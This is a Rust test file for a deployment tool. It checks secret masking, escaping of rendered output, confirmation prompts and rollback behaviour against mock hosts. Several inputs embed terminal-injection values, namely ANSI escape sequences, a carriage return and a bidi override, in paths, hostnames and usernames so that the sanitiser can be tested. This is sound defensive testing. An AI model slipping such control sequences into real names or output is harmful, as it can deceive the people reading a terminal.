    let failing = |command: &str, stderr: &str| {
        let mut rig = Rig::new("def5678");
        rig.local = rig.local.with(
            command,
            CommandOutput {
                success: false,
                code: 128,
                stdout: String::new(),
                stderr: stderr.to_owned(),
            },
        );
        rig
    };
    let message = |result: crate::error::Result<DeployReport>| match result {
        Err(crate::error::Error::Git(message)) => message,
        other => panic!("expected a git error: {other:?}"),
    };
    let dubious = message(
        failing(
            super::checkout::DIRTY_TREE_STATUS,
            "\nfatal: detected dubious ownership in repository at '/srv/a\u{1b}[2Kpp'\n\
             To add an exception for this directory, call:\n",
        )
        .deploy(&DeployOptions::default())
        .await,
    );
    assert_eq!(
        dubious,
        format!(
            "could not read the working tree (`{}`): fatal: detected dubious ownership in \
             repository at '/srv/a<U+001B>[2Kpp'",
            super::checkout::DIRTY_TREE_STATUS
        )
    );
    let no_repo = message(
        failing(
            "git rev-parse --short=12 HEAD",
            "fatal: not a git repository\n",
        )
        .deploy(&DeployOptions::default())
        .await,
    );
    assert_eq!(
        no_repo,
        "could not read the commit hash (`git rev-parse --short=12 HEAD`): fatal: not a git \
         repository"
    );
    let silent = message(
        failing(super::checkout::DIRTY_TREE_STATUS, "")
            .deploy(&DeployOptions::default())
            .await,
    );
    assert!(
        silent.ends_with("— run from the app's checkout"),
        "{silent}"
    );
}

/// A `current` that names no release is refused before anything is built or sent —
/// a dry run and a wetrun alike — since the script's own check would stop the run
/// before its swap. What `current` names is text read off the target, so the error
/// that quotes it is masked and escaped like the rest: a release directory named with
/// an escape sequence or a registered secret can't act on the terminal or leak.
#[tokio::test]
async fn a_current_naming_no_release_is_refused_before_the_build() {
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_RELEASE_SECRET", "hunter2hunter2");
    let mut rig = Rig::new("hunter2hunter2\u{1b}[2Kdef5678");
    rig.masker = registry.freeze().unwrap();
    for options in [
        DeployOptions::default(),
        DeployOptions {
            wetrun: true,
            ..DeployOptions::default()
        },
    ] {
        let error = rig.deploy(&options).await.unwrap_err();
        assert!(
            matches!(error, crate::error::Error::LiveReleaseUnknown(_)),
            "{error:?}"
        );
        assert_eq!(error.exit_code(), 2);
        let rendered = error.render();
        assert!(
            rendered.contains(
                "/srv/app/current names /srv/app/releases/[MASKED:ZAP_T_RELEASE_SECRET]\
                 <U+001B>[2Kdef5678, which is no release"
            ),
            "{rendered:?}"
        );
        assert!(rendered.contains("nothing ran"), "{rendered:?}");
        assert!(!rendered.contains('\u{1b}'));
        assert!(!rendered.contains("hunter2hunter2"));
    }
    let issued = rig.local.issued_commands();
    assert!(
        !issued.iter().any(|command| command == "make"),
        "{issued:?}"
    );
    let sent = rig.target.issued_commands();
    assert!(
        !sent.iter().any(|command| command.contains("zap_archive")),
        "{sent:?}"
    );
}

/// The names a preview prints outside its steps are escaped like the steps: the
/// header's declared target, the resolved host, the declared target's fields, and a
/// polled URL as it resolves.
// `{env:NAME}` is the notation a reference is shown in, written out here as text.
#[allow(clippy::literal_string_with_formatting_args)]
#[test]
fn the_names_a_preview_prints_are_escaped() {
    let deploy: DeploySpec = serde_json::from_value(serde_json::json!({
        "artifacts": ["build/"], "path": "/srv/app",
        "health": {"domain": Text::reference("DEPLOY_DOMAIN"), "path": "/health"},
    }))
    .unwrap();
    // A bidi override is one JSON leaves as it is, so the target line needs the escape.
    let target: Target = serde_json::from_value(serde_json::json!({
        "host": Text::reference("DEPLOY_HOST"), "user": "dep\u{202e}loy",
    }))
    .unwrap();
    let ctx = DeployContext {
        references: std::collections::BTreeMap::new(),
        version: "abc1234".to_owned(),
        target_user: "deploy".to_owned(),
        deployed_by: "op@box".to_owned(),
        previous_version: None,
        target_host: "h.example\u{1b}[2K.com".to_owned(),
        health_domain: "app.example\r.com".to_owned(),
        dirty: false,
        skip_build: false,
        preflight: DriftPreflight::NothingDeclared,
    };
    let rendered = render_deploy(&DeployReport {
        target: format!("{}\u{1b}[1A.example", marker("DEPLOY_HOST")),
        previous_version: None,
        plan: plan_deploy(&deploy, &target, &ctx),
        ..report(DeployOutcome::DryRun, vec![])
    });
    assert!(
        !rendered.contains(['\r', '\u{1b}', '\u{202e}']),
        "{rendered:?}"
    );
    for shown in [
        "deploy — target {env:DEPLOY_HOST}<U+001B>[1A.example (dry-run)\n",
        "  host: h.example<U+001B>[2K.com\n",
        "\"user\":\"dep<U+202E>loy\"",
        "      polls https://app.example<U+000D>.com/health\n",
    ] {
        assert!(rendered.contains(shown), "{shown}: {rendered}");
    }
}

/// What git said is masked, then escaped: a registered secret in it — one holding a
/// control character included — is its token in the error.
#[tokio::test]
async fn a_git_error_masks_what_git_said_before_escaping_it() {
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_CHECKOUT_SECRET", "hunter2\u{1b}hunter2");
    let mut rig = Rig::new("def5678");
    rig.masker = registry.freeze().unwrap();
    rig.local = rig.local.with(
        super::checkout::DIRTY_TREE_STATUS,
        CommandOutput {
            success: false,
            code: 128,
            stdout: String::new(),
            stderr: "fatal: not a git repository: '/srv/hunter2\u{1b}hunter2'\n".to_owned(),
        },
    );
    let result = rig.deploy(&DeployOptions::default()).await;
    let Err(crate::error::Error::Git(message)) = result else {
        panic!("expected a git error: {result:?}");
    };
    assert!(
        message.ends_with("fatal: not a git repository: '/srv/[MASKED:ZAP_T_CHECKOUT_SECRET]'"),
        "{message}"
    );
    assert!(!message.contains("hunter2"), "{message}");
}

/// An already-deployed target shows no plan and runs no preflight, so it says
/// nothing about the lock either: the report's standing stays clean.
#[tokio::test]
async fn an_already_deployed_target_says_nothing_about_the_lock() {
    use zap_types::lock::{LockEntry, ZapLock};
    use zap_types::scalar::ContentHash;
    use zap_types::schema::ResourceId;

    let mut rig = Rig::new("abc1234");
    rig.config.resources = vec![
        serde_json::from_value(serde_json::json!({
            "id": "blob", "type": "file", "path": "/opt/blob",
            "content": {"type": "remote", "url": "https://files.example/blob",
                        "extract": {"type": "none"}},
        }))
        .unwrap(),
    ];
    let lock = ZapLock {
        entries: [(
            ResourceId("blob".to_owned()),
            LockEntry::RemoteFile {
                config_hash: "not-this-config".to_owned(),
                blake3: ContentHash::new("a".repeat(64)).unwrap(),
            },
        )]
        .into(),
        ..ZapLock::default()
    };
    crate::lock::write_zap_lock(&crate::lock::lock_path_for(&rig.config_path), &lock).unwrap();
    for options in [DeployOptions::default(), wetrun()] {
        let report = rig.deploy(&options).await.unwrap();
        assert_eq!(report.outcome, DeployOutcome::AlreadyDeployed);
        assert!(!report.lock_standing.has_errors(), "{options:?}");
        assert!(!render_deploy(&report).contains("LOCK"), "{options:?}");
    }
}

// --- the prompt a wetrun with no review asks on a terminal ---

/// A wetrun that asks `prompt`.
fn asking(prompt: &std::sync::Arc<crate::commands::prompt::ScriptedPrompt>) -> DeployOptions {
    let prompt: std::sync::Arc<crate::commands::prompt::ScriptedPrompt> =
        std::sync::Arc::clone(prompt);
    DeployOptions {
        prompt: Some(prompt),
        ..wetrun()
    }
}

/// On a terminal, a cold wetrun shows the plan a refusal would show — masked as every
/// render is — with its hash, and asks for the start of it. Typed back, the deploy goes
/// on as a bound wetrun does: the drift preflight, the review spent before the first
/// step (a preview of another plan withdrawn), the steps — exactly the plan shown, its
/// hash unchanged.
#[tokio::test]
async fn a_cold_wetrun_on_a_terminal_deploys_the_plan_whose_hash_start_is_typed() {
    use crate::commands::Confirmation;
    use crate::commands::prompt::{DEPLOY_QUESTION, ScriptedPrompt, asked};

    let rig = Rig::new("def5678");
    let plan = rig.deploy_without_home(&DeployOptions::default()).await;
    let mut rig = rig.recording(&plan.unwrap().plan);
    // The checkout's hash is a secret here: what the prompt shows is masked.
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_DEPLOY_PROMPT_SECRET", "abc1234");
    rig.masker = registry.freeze().unwrap();
    // A preview of another plan (built with `--skip-build`) is on record.
    let other = rig
        .deploy(&DeployOptions {
            skip_build: true,
            ..DeployOptions::default()
        })
        .await
        .unwrap();
    assert!(rig.preview().is_some());

    let prompt = ScriptedPrompt::confirming();
    let wet = rig.deploy(&asking(&prompt)).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert_eq!(wet.confirmation, Some(Confirmation::Accepted));
    assert_ne!(wet.plan_hash, other.plan_hash);
    assert!(wet.streamed());
    assert_eq!(wet.exit_code(), 0);
    // The drift preflight ran after the confirmation, and the review was spent.
    assert_eq!(
        rig.last_run(),
        Some(zap_types::last_run::RunCommand::DeployPreflight)
    );
    assert_eq!(rig.preview(), None);
    let rendered = render_deploy(&wet);
    assert!(
        rendered.starts_with("deploy — target app.example.com (wetrun, confirmed)\n"),
        "{rendered}"
    );

    let shown = prompt.shown();
    let [shown] = shown.as_slice() else {
        panic!("asked once: {shown:?}");
    };
    assert!(
        shown.starts_with("deploy — target app.example.com (wetrun, awaiting confirmation)\n"),
        "{shown}"
    );
    assert!(
        shown.contains("  UNREVIEWED — this plan is not the one that was reviewed.\n    the last preview (zap deploy (dry run) at "),
        "{shown}"
    );
    assert!(shown.contains("  - Create tarball (tarball)"), "{shown}");
    assert!(
        shown.ends_with(&format!(
            "\nplan_hash: {}\n{}",
            wet.plan_hash,
            asked(DEPLOY_QUESTION, &wet.plan_hash)
        )),
        "{shown}"
    );
    assert!(!shown.contains("abc1234"), "{shown}");
    assert!(
        shown.contains("[MASKED:ZAP_T_DEPLOY_PROMPT_SECRET]"),
        "{shown}"
    );
    assert!(
        !shown.contains("REFUSED") && !shown.contains("re-run"),
        "{shown}"
    );
}

/// Anything but the start of the hash — a `y` first among them — is the refusal a cold
/// wetrun gets with no prompt: no preflight, no step, exit `2`, and the plan shown
/// recorded as the host's preview, which the next wetrun binds to unasked.
#[tokio::test]
async fn a_declined_prompt_refuses_records_the_plan_it_showed_and_the_next_deploys() {
    use crate::commands::Confirmation;
    use crate::commands::prompt::ScriptedPrompt;
    use zap_types::deploy_preview::DeployPreviewPass;

    for answer in [Some("y"), Some("yes\n"), Some("n"), Some(""), None] {
        let rig = Rig::new("def5678");
        let plan = rig.deploy_without_home(&DeployOptions::default()).await;
        let rig = rig.recording(&plan.unwrap().plan);

        let prompt = ScriptedPrompt::answering(answer);
        let declined = rig.deploy(&asking(&prompt)).await.unwrap();
        assert_eq!(
            declined.outcome,
            DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
            "{answer:?}"
        );
        assert_eq!(declined.confirmation, Some(Confirmation::Declined));
        assert_eq!(prompt.shown().len(), 1);
        assert_eq!(declined.exit_code(), 2);
        assert!(!declined.streamed() && declined.step_outcomes.is_empty());
        assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
        assert!(rig.target.issued_queries().is_empty(), "no preflight");
        let preview = rig.preview().expect("the refusal records what it showed");
        assert_eq!(preview.plan_hash, declined.plan_hash);
        assert_eq!(preview.pass, DeployPreviewPass::RefusedWetrun);
        let rendered = render_deploy(&declined);
        assert!(
            rendered.starts_with("deploy — target app.example.com (wetrun, declined)\n"),
            "{rendered}"
        );
        assert!(
            rendered.ends_with(
                &GOLDEN_NO_PREVIEW_TAIL
                    .replace(
                        "  REFUSED — nothing ran: this plan is not the one that was reviewed.",
                        "  DECLINED — nothing ran: this plan was not confirmed, and is not the \
                         one that was reviewed."
                    )
                    .replace("deadbeef", &declined.plan_hash)
            ),
            "{rendered}"
        );

        let again = ScriptedPrompt::confirming();
        let wet = rig.deploy(&asking(&again)).await.unwrap();
        assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
        assert_eq!(wet.confirmation, None);
        assert!(again.shown().is_empty());
    }
}

/// The prompt is no bypass: `--expect-plan` naming another plan refuses unasked,
/// `--json` never asks, a run with no terminal refuses as it always has, and a wetrun
/// bound to its preview deploys unasked. A plan that names no one machine is refused
/// as it was, asked nothing.
#[tokio::test]
async fn a_deploy_asks_only_on_a_terminal_with_nothing_reviewed_or_named() {
    use crate::commands::prompt::ScriptedPrompt;

    let rig = Rig::new("def5678");
    let plan = rig.deploy_without_home(&DeployOptions::default()).await;
    let rig = rig.recording(&plan.unwrap().plan);

    let prompt = ScriptedPrompt::confirming();
    let refused = rig
        .deploy(&DeployOptions {
            expect_plan: Some("another".to_owned()),
            ..asking(&prompt)
        })
        .await
        .unwrap();
    assert!(matches!(
        refused.outcome,
        DeployOutcome::Refused(PlanUnreviewed::Expected { .. })
    ));
    assert_eq!(refused.confirmation, None);
    assert!(prompt.shown().is_empty());

    for options in [
        DeployOptions {
            emit_json: true,
            ..asking(&ScriptedPrompt::confirming())
        },
        asking(&ScriptedPrompt::no_terminal()),
    ] {
        let rig = Rig::new("def5678");
        let refused = rig.deploy(&options).await.unwrap();
        assert_eq!(
            refused.outcome,
            DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None })
        );
        assert_eq!(refused.confirmation, None);
        assert!(render_deploy(&refused).contains("(wetrun, refused)"));
        assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
    }
    let prompt = ScriptedPrompt::no_terminal();
    rig.deploy(&asking(&prompt)).await.unwrap();
    assert!(prompt.shown().is_empty());
    let prompt = ScriptedPrompt::confirming();
    rig.deploy(&DeployOptions {
        emit_json: true,
        ..asking(&prompt)
    })
    .await
    .unwrap();
    assert!(prompt.shown().is_empty());

    // Now bound to the refusal's preview: deploys, unasked.
    let prompt = ScriptedPrompt::confirming();
    let wet = rig.deploy(&asking(&prompt)).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert_eq!(wet.confirmation, None);
    assert!(prompt.shown().is_empty());

    let _env = crate::resolve::test_env::set(&[("ZAP_T_PROMPT_HOST_TOKEN", "hidden.example.com")]);
    let rig = Rig::on(&Text::reference("ZAP_T_PROMPT_HOST_TOKEN"), "def5678");
    let prompt = ScriptedPrompt::confirming();
    let result = rig.deploy(&asking(&prompt)).await;
    assert!(
        matches!(&result, Err(crate::error::Error::WetrunRefused(message))
            if message.starts_with("a deploy wetrun needs a plan that names one machine")),
        "{result:?}"
    );
    assert!(prompt.shown().is_empty());
}

/// A confirmation is a review, not a pass through the preflight: a target that drifted,
/// or that the preflight can't read, stops the deploy after it as after a recorded review,
/// with nothing run and nothing recorded.
#[tokio::test]
async fn a_confirmed_deploy_still_stops_at_the_drift_preflight() {
    use crate::commands::Confirmation;
    use crate::commands::prompt::ScriptedPrompt;

    let mut rig = Rig::new("def5678");
    rig.target = MockConnection::new(HOST).with_user("deploy").with(
        "if [ -L '/srv/app/current' ]; then readlink -- '/srv/app/current'; elif [ -e '/srv/app/current' ]; then exit 4; else exit 3; fi",
        ok("/srv/app/releases/def5678\n"),
    );
    let prompt = ScriptedPrompt::confirming();
    let report = rig.deploy(&asking(&prompt)).await.unwrap();
    assert_eq!(report.outcome, DeployOutcome::PreflightUndetermined);
    assert_eq!(report.confirmation, Some(Confirmation::Accepted));
    assert_eq!(report.exit_code(), 2);
    assert_eq!(prompt.shown().len(), 1);
    assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
    assert_eq!(rig.previews_on_disk(), Vec::<String>::new());
}

/// A loopback port no health check passes on: held for the rest of the test run (so
/// no other test's server can take it), each connection dropped as it is accepted.
fn refusing_port() -> u16 {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for connection in listener.incoming() {
            drop(connection);
        }
    });
    port
}

/// A deploy with a restart and a health check on `port`, where nothing answers, planned
/// for a target serving `live`: every wetrun of it fails its health check after the swap.
fn unhealthy_rig(port: u16, live: &str) -> Rig {
    let mut rig = Rig::new(live).with_deploy(serde_json::json!({
        "build": "make", "artifacts": ["build/"], "path": "/srv/app", "service": "app",
        "health": {"domain": Text::literal(&format!("127.0.0.1:{port}")), "path": "/health",
                   "attempts": 1, "interval_ms": 0},
    }));
    rig.config.target.service_manager = Some(ServiceManager::Systemd);
    rig
}

/// The command of `plan`'s restart step.
fn restart_of(plan: &DeployPlan) -> String {
    plan.steps
        .iter()
        .find_map(|step| match &step.action {
            DeployAction::Restart { command } => Some(command.clone()),
            _ => None,
        })
        .expect("a restart step")
}

/// Each event of a `--json` stream as `<kind> <step>`.
fn event_labels(events: &std::sync::Mutex<Vec<zap_types::event::Event>>) -> Vec<String> {
    use zap_types::event::Event;
    events
        .lock()
        .unwrap()
        .iter()
        .map(|event| match event {
            Event::RunStarted { .. } => "run_started".to_owned(),
            Event::StepStarted { step, .. } => format!("step_started {step}"),
            Event::StepCompleted { step, .. } => format!("step_completed {step}"),
            Event::StepFailed { step, .. } => format!("step_failed {step}"),
            Event::StepSkipped { step, .. } => format!("step_skipped {step}"),
            Event::RunFinished { .. } => "run_finished".to_owned(),
            other => format!("{other:?}"),
        })
        .collect()
}

/// A wetrun whose health check fails after the swap rolls back end to end: it swaps
/// `current` back to the previous release, restarts it, and checks its health again,
/// and its event stream says so in that order, the rollback between the failed health
/// check and the run's end.
#[tokio::test]
async fn a_failed_health_check_after_the_swap_rolls_back_restarts_and_rechecks() {
    let port = refusing_port();
    let dry = unhealthy_rig(port, "def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    let mut rig = unhealthy_rig(port, "def5678").recording(&dry.plan);
    let swap_back = zap_types::deploy::rollback_swap_command("/srv/app", &dry.version, "def5678");
    let restart = restart_of(&dry.plan);
    rig.target = rig.target.with(swap_back.clone(), ok("rolled_back\n"));
    let events = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let report = rig
        .deploy(&DeployOptions {
            capture: Some(std::sync::Arc::clone(&events)),
            ..wetrun_expecting(&dry.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, DeployOutcome::Failed, "{report:?}");
    assert_eq!(report.exit_code(), 1);

    // Past the plan's own steps: the swap back, then the restart of what it restored.
    let issued = rig.target.issued_commands();
    let swapped = issued
        .iter()
        .position(|c| *c == swap_back)
        .expect("swapped back");
    assert_eq!(issued[swapped + 1..], [restart]);
    let [warning] = report.warnings.as_slice() else {
        panic!("{:?}", report.warnings);
    };
    assert!(
        warning.contains("rolled back to def5678 and restarted, but its health check ALSO failed"),
        "{warning}"
    );
    assert_eq!(
        event_labels(&events),
        [
            "run_started",
            "step_started build",
            "step_completed build",
            "step_started tarball",
            "step_completed tarball",
            "step_started upload",
            "step_completed upload",
            "step_started extract_swap",
            "step_completed extract_swap",
            "step_started restart",
            "step_completed restart",
            "step_started health",
            "step_failed health",
            "step_skipped readiness",
            "step_started rollback",
            "step_failed rollback",
            "run_finished",
        ]
    );
}

/// A wetrun whose health check fails after the swap, with nothing to roll back to — a
/// `--force` redeploy of the live release — runs nothing past its steps, and its event
/// stream reports the rollback skipped after the failed health check and before the
/// run's end.
#[tokio::test]
async fn a_rollback_that_cannot_start_is_skipped_between_the_failed_health_check_and_the_end() {
    let forced = |options: DeployOptions| DeployOptions {
        force: true,
        ..options
    };
    let port = refusing_port();
    let version = unhealthy_rig(port, "def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap()
        .version;
    let dry = unhealthy_rig(port, &version)
        .deploy(&forced(DeployOptions::default()))
        .await
        .unwrap();
    let rig = unhealthy_rig(port, &version).recording(&dry.plan);
    let events = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let report = rig
        .deploy(&DeployOptions {
            capture: Some(std::sync::Arc::clone(&events)),
            ..forced(wetrun_expecting(&dry.plan_hash))
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, DeployOutcome::Failed, "{report:?}");
    let restart = restart_of(&dry.plan);
    assert_eq!(
        rig.target
            .issued_commands()
            .iter()
            .filter(|c| **c == restart)
            .count(),
        1,
        "only the deploy's own restart ran"
    );
    assert_eq!(
        event_labels(&events),
        [
            "run_started",
            "step_started build",
            "step_completed build",
            "step_started tarball",
            "step_completed tarball",
            "step_started upload",
            "step_completed upload",
            "step_started extract_swap",
            "step_completed extract_swap",
            "step_started restart",
            "step_completed restart",
            "step_started health",
            "step_failed health",
            "step_skipped readiness",
            "step_skipped rollback",
            "run_finished",
        ]
    );
}

/// A wetrun whose restart fails after the swap rolls back: the health and readiness
/// checks are skipped, the rollback swaps `current` back and runs the same restart,
/// and when that fails too the rollback step fails with the warning that says so.
#[tokio::test]
async fn a_failed_restart_after_the_swap_rolls_back() {
    let port = refusing_port();
    let dry = unhealthy_rig(port, "def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    let restart = restart_of(&dry.plan);
    let mut rig = unhealthy_rig(port, "def5678").recording(&dry.plan);
    let swap_back = zap_types::deploy::rollback_swap_command("/srv/app", &dry.version, "def5678");
    rig.target = rig
        .target
        .with(swap_back.clone(), ok("rolled_back\n"))
        .with(
            restart.clone(),
            CommandOutput {
                success: false,
                code: 1,
                stdout: String::new(),
                stderr: "Job for app.service failed".to_owned(),
            },
        );
    let events = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let report = rig
        .deploy(&DeployOptions {
            capture: Some(std::sync::Arc::clone(&events)),
            ..wetrun_expecting(&dry.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, DeployOutcome::Failed, "{report:?}");
    assert_eq!(report.exit_code(), 1);

    // Past the plan's own steps: the swap back, then the restart of what it restored.
    let issued = rig.target.issued_commands();
    let swapped = issued
        .iter()
        .position(|c| *c == swap_back)
        .expect("swapped back");
    assert_eq!(&issued[swapped + 1..], std::slice::from_ref(&restart));
    assert_eq!(issued.iter().filter(|c| **c == restart).count(), 2);
    let [warning] = report.warnings.as_slice() else {
        panic!("{:?}", report.warnings);
    };
    assert!(
        warning.contains("rolled `current` back to def5678 but the restart FAILED"),
        "{warning}"
    );
    assert_eq!(
        event_labels(&events),
        [
            "run_started",
            "step_started build",
            "step_completed build",
            "step_started tarball",
            "step_completed tarball",
            "step_started upload",
            "step_completed upload",
            "step_started extract_swap",
            "step_completed extract_swap",
            "step_started restart",
            "step_failed restart",
            "step_skipped health",
            "step_skipped readiness",
            "step_started rollback",
            "step_failed rollback",
            "run_finished",
        ]
    );
}

/// A rollback whose swap back finds nothing to do — another deploy holds the lock,
/// `current` was replaced or names nothing, the previous release is gone — started and
/// then reports the step skipped, with the warning that says why, and restarts
/// nothing: only the deploy's own restart ran.
#[tokio::test]
async fn a_rollback_whose_swap_back_finds_nothing_to_do_starts_then_is_skipped() {
    let port = refusing_port();
    let dry = unhealthy_rig(port, "def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    let restart = restart_of(&dry.plan);
    let swap_back = zap_types::deploy::rollback_swap_command("/srv/app", &dry.version, "def5678");
    for (said, warned) in [
        ("busy\n", "another deploy is running for this app"),
        ("replaced\n", "a newer deploy replaced it"),
        ("absent\n", "`current` names nothing"),
        ("gone\n", "(def5678) is no longer on the host"),
    ] {
        let mut rig = unhealthy_rig(port, "def5678").recording(&dry.plan);
        rig.target = rig.target.with(swap_back.clone(), ok(said));
        let events = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
        let report = rig
            .deploy(&DeployOptions {
                capture: Some(std::sync::Arc::clone(&events)),
                ..wetrun_expecting(&dry.plan_hash)
            })
            .await
            .unwrap();
        assert_eq!(report.outcome, DeployOutcome::Failed, "{said}: {report:?}");
        assert_eq!(report.exit_code(), 1);
        let issued = rig.target.issued_commands();
        assert_eq!(issued.last(), Some(&swap_back), "{said}: {issued:?}");
        assert_eq!(
            issued.iter().filter(|c| **c == restart).count(),
            1,
            "{said}: only the deploy's own restart ran"
        );
        let [warning] = report.warnings.as_slice() else {
            panic!("{said}: {:?}", report.warnings);
        };
        assert!(warning.contains(warned), "{said}: {warning}");
        assert_eq!(
            event_labels(&events),
            [
                "run_started",
                "step_started build",
                "step_completed build",
                "step_started tarball",
                "step_completed tarball",
                "step_started upload",
                "step_completed upload",
                "step_started extract_swap",
                "step_completed extract_swap",
                "step_started restart",
                "step_completed restart",
                "step_started health",
                "step_failed health",
                "step_skipped readiness",
                "step_started rollback",
                "step_skipped rollback",
                "run_finished",
            ],
            "{said}"
        );
    }
}

/// A deploy that fails before its swap never moved `current`, so it rolls nothing back:
/// no rollback step on the event stream and no rollback warning.
#[tokio::test]
async fn a_failure_before_the_swap_rolls_nothing_back() {
    let port = refusing_port();
    let dry = unhealthy_rig(port, "def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    let mut rig = unhealthy_rig(port, "def5678").recording(&dry.plan);
    let remote = dry
        .plan
        .steps
        .iter()
        .find_map(|step| match &step.action {
            DeployAction::Upload { remote } => Some(remote.clone()),
            _ => None,
        })
        .unwrap();
    rig.target = rig.target.with(
        upload_put(&remote),
        CommandOutput {
            success: false,
            code: 1,
            stdout: String::new(),
            stderr: "no space left on device".to_owned(),
        },
    );
    let events = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let report = rig
        .deploy(&DeployOptions {
            capture: Some(std::sync::Arc::clone(&events)),
            ..wetrun_expecting(&dry.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, DeployOutcome::Failed, "{report:?}");
    let labels = event_labels(&events);
    assert!(
        labels.contains(&"step_failed upload".to_owned()),
        "{labels:?}"
    );
    assert!(
        !labels.iter().any(|label| label.ends_with(" rollback")),
        "{labels:?}"
    );
    assert_eq!(labels.last().map(String::as_str), Some("run_finished"));
    assert!(
        !report.warnings.iter().any(|w| w.contains("roll")),
        "{:?}",
        report.warnings
    );
}
